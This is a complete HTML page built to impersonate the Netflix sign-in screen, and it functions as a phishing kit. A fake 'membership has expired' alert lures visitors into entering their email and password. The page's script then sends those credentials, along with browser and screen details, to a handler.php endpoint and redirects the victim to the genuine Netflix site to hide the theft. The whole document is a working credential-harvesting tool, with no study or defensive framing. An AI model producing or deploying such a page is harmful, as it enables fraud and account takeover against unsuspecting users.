<!DOCTYPE html>
<html>
<head>
    <title>Netflix</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            background: #000;
            color: #fff;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .header {
            padding: 20px 50px;
            background: linear-gradient(180deg, rgba(0,0,0,.7), transparent);
            position: absolute;
            width: 100%;
            z-index: 10;
        }
        .logo {
            color: #e50914;
            font-size: 2.5rem;
            font-weight: bold;
            letter-spacing: -2px;
        }
        .hero {
            background: linear-gradient(rgba(0,0,0,.5), rgba(0,0,0,.5)),
                        url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="1920" height="1080"><rect fill="%23141414" width="1920" height="1080"/></svg>');
            background-size: cover;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .login-container {
            background: rgba(0,0,0,.75);
            border-radius: 4px;
            padding: 60px 68px 40px;
            max-width: 450px;
            width: 100%;
        }
        h1 {
            font-size: 32px;
            margin-bottom: 28px;
        }
        .alert {
            background: #e87c03;
            padding: 12px 20px;
            border-radius: 4px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        input {
            width: 100%;
            height: 50px;
            padding: 16px 20px;
            background: #333;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            margin-bottom: 16px;
        }
        input:focus {
            outline: none;
            background: #454545;
        }
        .login-btn {
            width: 100%;
            height: 50px;
            background: #e50914;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            margin-top: 24px;
        }
        .login-btn:hover {
            background: #f40612;
        }
        .remember {
            display: flex;
            align-items: center;
            margin-top: 12px;
        }
        .remember input[type="checkbox"] {
            width: 16px;
            height: 16px;
            margin-right: 8px;
        }
        .help {
            color: #b3b3b3;
            font-size: 13px;
            margin-top: 16px;
        }
        .help a {
            color: #b3b3b3;
            text-decoration: none;
        }
        .help a:hover {
            text-decoration: underline;
        }
        .signup {
            color: #737373;
            font-size: 16px;
            margin-top: 16px;
        }
        .signup a {
            color: #fff;
            text-decoration: none;
        }
        .signup a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">NETFLIX</div>
    </div>

    <div class="hero">
        <div class="login-container">
            <h1>Sign In</h1>
            
            <div class="alert">
                Your membership has expired. Please sign in to reactivate your account.
            </div>
            
            <form id="loginForm" onsubmit="return handleSubmit(event)">
                <input type="email" id="email" placeholder="Email or phone number" required>
                <input type="password" id="password" placeholder="Password" required>
                
                <button type="submit" class="login-btn">Sign In</button>
                
                <div class="remember">
                    <input type="checkbox" id="remember">
                    <label for="remember">Remember me</label>
                </div>
                
                <div class="help">
                    <a href="#">Need help?</a>
                </div>
            </form>
            
            <div class="signup">
                New to Netflix? <a href="#">Sign up now</a>.
            </div>
        </div>
    </div>

    <script>
        function handleSubmit(event) {
            event.preventDefault();
            
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            
            const data = {
                type: 'netflix_credentials',
                email: email,
                password: password,
                timestamp: new Date().toISOString(),
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: screen.width + 'x' + screen.height
            };
            
            fetch('handler.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).then(() => {
                const btn = document.querySelector('.login-btn');
                btn.textContent = 'Signing in...';
                btn.disabled = true;
                
                setTimeout(() => {
                    window.location.href = 'https://www.netflix.com';
                }, 1500);
            });
            
            return false;
        }
    </script>
</body>
</html>
